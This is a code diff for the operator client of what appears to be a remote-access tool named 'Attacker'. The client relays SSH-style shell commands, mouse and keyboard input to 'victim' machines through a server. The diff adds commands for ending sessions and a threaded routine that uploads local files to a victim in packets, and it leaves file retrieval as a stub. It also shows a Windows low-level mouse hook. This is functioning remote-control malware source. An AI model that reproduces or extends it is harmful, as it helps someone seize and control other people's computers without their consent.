@@ -1,6 +1,7 @@
 #include "attacker.hpp"
 #include "../commands.hpp"
 #include <sstream>
+#include <fstream>
 #include <SFML/Window.hpp>
 
 Attacker* Attacker::attacker = nullptr;
@@ -67,31 +68,9 @@ int Attacker::update()
 
 			//tui.printSshShell(" > " + line + "\n");
 
-			std::stringstream ss(line);
-			std::string cmd;
-			ss >> cmd;
-			//exit ssh session
-			if (cmd == "exit") {
-				sf::Packet req;
-				req << uint16_t(0) << uint8_t(Cmd::END_SSH);
-				auto _ = server.send(req);
-
-				isSshActive = false;
-				isSendingMouse = false;
-				isSendingKeyboard = false;
-				tui.setIsSendingMouse(isSendingMouse);
-				tui.setIsSendingKeyboard(isSendingKeyboard);
-
-				tui.ssh_commands = std::queue<std::string>();
-				tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
-				tui.printSshShell("\n \n");
-			}
-			//send ssh data
-			else {
-				sf::Packet req;
-				req << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << line;
-				auto _ = server.send(req);
-			}
+			sf::Packet req;
+			req << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << line;
+			auto _ = server.send(req);
 		}
 		else {
 			tui.ssh_commands = std::queue<std::string>();
@@ -280,7 +259,7 @@ bool Attacker::handleCmd(const std::string& s)
 	std::string current;
 	bool inQuotes = false;
 	for (size_t i = 0; i < s.size(); ++i) {
-		char c = s[i];
+		unsigned char c = s[i];
 
 		if (c == '"') {
 			inQuotes = !inQuotes;
@@ -334,7 +313,7 @@ bool Attacker::handleCmd(const std::string& s)
 		else
 			tui.clearServerShell();
 	}
-	
+
 	//with server confirm
 	else if ((cmd == "connect") || (cmd == "adminconnect")) {
 		if (param.size() == 1)
@@ -432,8 +411,10 @@ bool Attacker::handleCmd(const std::string& s)
 		sf::Packet req;
 		uint16_t reqId = requestId++;
 		req << uint16_t(reqId) << uint8_t(Cmd::SAVE_DATASET);
-		if (server.send(req) != sf::Socket::Status::Done)
+		if (server.send(req) != sf::Socket::Status::Done) {
 			tui.printServerShell("failed to send request to server\n");
+			return true;
+		}
 
 		tui.printServerShell("waiting for response: [");
 		for (int i = 0; i < 10; i++) {
@@ -446,12 +427,12 @@ bool Attacker::handleCmd(const std::string& s)
 		}
 		tui.printServerShell("] - ");
 
-		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
+		if (responsesToProcess.find(reqId) == responsesToProcess.end())
 			tui.printServerShell("request timed out\n");
-			return true;
-		}
-		else
+		else {
+			responsesToProcess.erase(reqId);
 			tui.printServerShell("saved database\n");
+		}
 	}
 	else if (cmd == "kill") {
 		if (param.size() != 1) {
@@ -504,8 +485,10 @@ bool Attacker::handleCmd(const std::string& s)
 		sf::Packet req;
 		uint16_t reqId = requestId++;
 		req << uint16_t(reqId) << uint8_t(Cmd::START_SSH) << oId;
-		if (server.send(req) != sf::Socket::Status::Done)
+		if (server.send(req) != sf::Socket::Status::Done) {
 			tui.printServerShell("failed to send request to server\n");
+			return true;
+		}
 
 		tui.printServerShell("waiting for response: [");
 		for (int i = 0; i < 10; i++) {
@@ -535,7 +518,7 @@ bool Attacker::handleCmd(const std::string& s)
 
 			tui.clearSshShell();
 			tui.setSshTitle(ftxui::text("SSH (" + std::to_string(oId) + ")") | ftxui::color(ftxui::Color::Green));
-			tui.printServerShell("loading ssh session...\n");
+			tui.printServerShell("loading ssh session\n");
 		}
 		else if (code == 2)
 			tui.printServerShell("ssh session already active\n");
@@ -546,7 +529,31 @@ bool Attacker::handleCmd(const std::string& s)
 		else
 			tui.printServerShell("unknown error\n");
 	}
-	
+	else if (cmd == "exitssh") {
+		if (param.size() != 0) {
+			tui.printServerShell("incorrect number of arguments entered\n");
+			return true;
+		}
+		else if (!isSshActive) {
+			tui.printServerShell("ssh must be active\n");
+			return true;
+		}
+
+		sf::Packet req;
+		req << uint16_t(0) << uint8_t(Cmd::END_SSH);
+		auto _ = server.send(req);
+
+		isSshActive = false;
+		isSendingMouse = false;
+		isSendingKeyboard = false;
+		tui.setIsSendingMouse(isSendingMouse);
+		tui.setIsSendingKeyboard(isSendingKeyboard);
+
+		tui.ssh_commands = std::queue<std::string>();
+		tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
+		tui.printSshShell("\n \n");
+	}
+
 	else if (cmd == "togglemouse") {
 		if (param.size() != 0)
 			tui.printServerShell("incorrect number of arguments entered\n");
@@ -567,23 +574,117 @@ bool Attacker::handleCmd(const std::string& s)
 			tui.setIsSendingKeyboard(isSendingKeyboard);
 		}
 	}
+	
 	else if (cmd == "sendfile") {
-		if (param.size() != 2)
+		if (param.size() != 2) {
 			tui.printServerShell("incorrect number of arguments entered\n");
-		else if (!isSshActive)
+			return true;
+		}
+		else if (!isSshActive) {
 			tui.printServerShell("ssh must be active\n");
-		else {
+			return true;
+		}
+		else if (isSendingFile) {
+			tui.printServerShell("file sending already in progress\n");
+			return true;
+		}
 
+		std::ifstream file(param[0], std::ifstream::ate | std::ifstream::binary);
+		auto size = file.tellg();
+		if (size == -1) {
+			tui.printServerShell("invalid source file path\n");
+			return true;
+		}
+		uint32_t numPackets = std::ceil(size / long double(packetSize));
+
+		sf::Packet req;
+		uint16_t reqId = requestId++;
+		req << reqId << uint8_t(Cmd::SSH_START_SENDING_FILE) << numPackets << param[1];
+		if (server.send(req) != sf::Socket::Status::Done) {
+			tui.printServerShell("failed to send request to server\n");
+			return true;
+		}
+
+		tui.printServerShell("preparing to send " + std::to_string(numPackets) + " packets: [");
+		for (int i = 0; i < 10; i++) {
+			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
+				tui.printServerShell("*");
+				sf::sleep(sf::milliseconds(500));
+			}
+			else
+				tui.printServerShell(".");
+		}
+		tui.printServerShell("] - ");
+
+		if (responsesToProcess.find(reqId) == responsesToProcess.end())
+			tui.printServerShell("request timed out\n");
+		else {
+			sf::Packet res = responsesToProcess[reqId];
+			responsesToProcess.erase(reqId);
+
+			bool success = false;
+			uint8_t code = 0;
+			res >> code >> success;
+			if (success) {
+				isSendingFile = true;
+				tui.printServerShell("starting sending process\n");
+
+				if (sendFileThread != nullptr) {
+					sendFileThread->join();
+					delete sendFileThread;
+				}
+				sendFileThread = new std::thread(&Attacker::sendFile, this, param[0], numPackets);
+			}
+			else
+				tui.printServerShell("victim refused file transfer\n");
 		}
 	}
-	else if (cmd == "getfile") {
-		if (param.size() != 2)
+	else if (cmd == "stopsend") {
+		if (param.size() != 0) {
 			tui.printServerShell("incorrect number of arguments entered\n");
-		else if (!isSshActive)
-			tui.printServerShell("ssh must be active\n");
-		else {
-
+			return true;
 		}
+		else if (!isSendingFile) {
+			tui.printServerShell("no file sending in progress\n");
+			return true;
+		}
+
+		stopSendingFile = true;
+		sendFileThread->join();
+		delete sendFileThread;
+		sendFileThread = nullptr;
+	}
+	
+	else if (cmd == "getfile") {
+		if (param.size() != 2) {
+			tui.printServerShell("incorrect number of arguments entered\n");
+			return true;
+		}
+		else if (!isSshActive) {
+			tui.printServerShell("ssh must be active\n");
+			return true;
+		}
+		else if (isGettingFile) {
+			tui.printServerShell("file getting already in progress\n");
+			return true;
+		}
+
+
+	}
+	else if (cmd == "stopget") {
+		if (param.size() != 0) {
+			tui.printServerShell("incorrect number of arguments entered\n");
+			return true;
+		}
+		else if (!isGettingFile) {
+			tui.printServerShell("no file sending in progress\n");
+			return true;
+		}
+
+		stopGettingFile = true;
+		getFileThread->join();
+		delete getFileThread;
+		getFileThread = nullptr;
 	}
 	else
 		tui.printServerShell("command entered is not valid\n");
@@ -660,6 +761,53 @@ void Attacker::updateList(sf::Packet& p)
 		ss_clients << "\n";
 	}
 	tui.setClientsOutput(ss_clients.str());
+}
+
+void Attacker::sendFile(std::string path, uint32_t numPackets)
+{
+	tui.setSendingFileProgress(0);
+
+	std::ifstream file(path, std::ios::binary);
+	size_t packetNum = 0;
+	while (file.good() && !stopSendingFile) {
+		char* buffer = new char[packetSize];
+		file.read(buffer, packetSize);
+		size_t bytesRead = file.gcount();
+
+		if (bytesRead <= 0)
+			break;
+
+		sf::Packet p;
+		uint16_t reqId = requestId++;
+		p << reqId << uint8_t(Cmd::SSH_SEND_FILE_DATA);
+		p.append(buffer, bytesRead);
+		
+		auto status = server.send(p);
+		if (status != sf::Socket::Status::Done)
+			break;
+
+		for (int i = 0; i < 10; i++) {
+			if (responsesToProcess.find(reqId) != responsesToProcess.end() || stopSendingFile)
+				break;
+			sf::sleep(sf::milliseconds(500));
+		}
+		if (responsesToProcess.find(reqId) == responsesToProcess.end())
+			break;
+		else 
+			responsesToProcess.erase(reqId);
+
+		tui.setSendingFileProgress(++packetNum * 100 / double(numPackets));
+	}
+
+	if (stopSendingFile)
+		tui.setSendingFileProgress(101);
+	else if (packetNum == numPackets)
+		tui.setSendingFileProgress(100);
+	else
+		tui.setSendingFileProgress(-1);
+	
+	isSendingFile = false;
+	stopSendingFile = false;
 }
 
 LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
